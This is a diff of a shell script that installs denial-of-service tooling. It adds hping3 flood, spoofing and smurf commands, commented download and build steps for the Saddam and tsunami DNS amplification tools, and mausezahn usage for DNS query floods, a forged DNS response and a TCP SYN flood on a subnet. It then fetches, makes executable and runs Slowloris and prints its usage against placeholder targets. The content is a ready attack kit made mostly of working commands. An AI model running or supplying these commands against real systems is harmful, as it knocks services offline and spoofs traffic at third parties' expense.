@@ -19,7 +19,7 @@ echo "
                             |_|                                             |___|
 
 \r\n \r\n
-Version:  0.0.1                             \r\n
+Version:  0.0.2                             \r\n
 Last Updated:  4/10/2018
 \r\n \r\n
 Updating system first..."
@@ -61,5 +61,71 @@ echo "  \r\n \r\n \r\n
  hping3 -2 -c 1000000 -s 5151 -p 80  --rand-source 10.1.1.1                   \r\n
  hping3 -S -P -U --flood -V --rand-source 10.1.1.1                              \r\n
  hping3 -c 20000 -d 120 -S -w 64 -p 443 --flood --rand-source 10.1.1.1           \r\n
- hping3 --icmp --spoof 10.1.1.1 BROADCAST_IP     \r\n
+
+
+DNS smurf Attack:  hping3 --icmp --spoof TARGET_IP BROADCAST_IP    \r\n
+ 
 "
+
+
+#---------- SADDAM
+# https://github.com/OffensivePython/Saddam
+#wget https://raw.githubusercontent.com/OffensivePython/Saddam/master/Saddam.py
+
+#----- tsunami DNS Attack tool
+# https://canyoupwn.me/dns-amplification-attack/
+#wget http://www.infosec-ninjas.com/files/tsunami-0.0.9.tar.gz
+
+#sudo apt-get -y install dh-autoreconf libpcap-dev nload
+#cd tsunami-0.0.9/
+#autoconf -i
+#sudo ./configure
+#sudo make
+
+#-- usage
+#Usage: ./tsunami [-i <iface>] [-v] [-s <source>] [-n <domain name >]           [-l <amplify level>] [-f <input file>] [-o <output file>]
+#sudo ./tsunami -o recursive_dns.txt -l 4 -e 172.0.0.0/8
+
+
+#--- MZ tool
+# http://linuxpoison.blogspot.in/2010/01/mz-mausezahn-network-traffic-generation.html
+echo "Installing MZ tool \r\n "
+sudo apt-get -y install mz
+
+#-- usage
+# Here we showed the source rope as 5.5.5.5 and sent 1000 packets to 1.2.39.40. We are provided with a novelty to generate random DNS queries.
+
+#mz -A 5.5.5.5 -B 1.2.39.40 -t dns “q=google.com” -c 1000
+echo "\r\n \r\n Usage: mz -A rand -B TARGET_DNS_SERVER -t dns "q=pentest.blog" -c 10000000 \r\n
+
+\r\n
+Using Mausezahn: \r\n
+Send an arbitrary sequence of bytes through your network card 1000 times: \r\n
+mz eth0 -c 1000 \"ff:ff:ff:ff:ff:ff ff:ff:ff:ff:ff:ff cc:dd 00:00:00:ca:fe:ba:be\" \r\n
+\r\n
+
+You can send more complex packets easily with the built-in packet builders using the -t option. Let's send a forged DNS response to host 192.168.1.2 by impersonating the DNS server x.x.x.x:   \r\n
+mz eth0  -A x.x.x.x -B 192.168.1.2 -t dns \"q=www.xxxxxxxx.com, a=172.16.6.66\" . \r\n
+\r\n
+
+Perform a TCP SYN-Flood attack against all hosts in subnet 10.5.5.0/24  \r\n
+mz eth0 -c 0 -Q 50,100 -A rand -B 10.5.5.0/25 -t tcp \"flags=syn, dp=1-1023\"
+
+\r\n \r\n
+"
+
+
+#--- Slowloris
+echo "\r\n \r\n Downloading Slowloris... \r\n "
+# https://github.com/llaera/slowloris.pl
+sudo apt-get -y install perl libwww-mechanize-shell-perl perl-mechanize
+wget https://raw.githubusercontent.com/llaera/slowloris.pl/master/slowloris.pl && chmod u+x slowloris.pl
+
+./slowloris.pl
+echo "
+Usage: \r\n
+perl slowloris.pl -dns (Victim URL or IP) -options \r\n
+./slowloris.pl -dns TARGET_URL -port 443 -timeout 30 -num 200 -https \r\n
+./slowloris.pl -dns TARGET_URL -port 80 -num 200   \r\n
+"
+
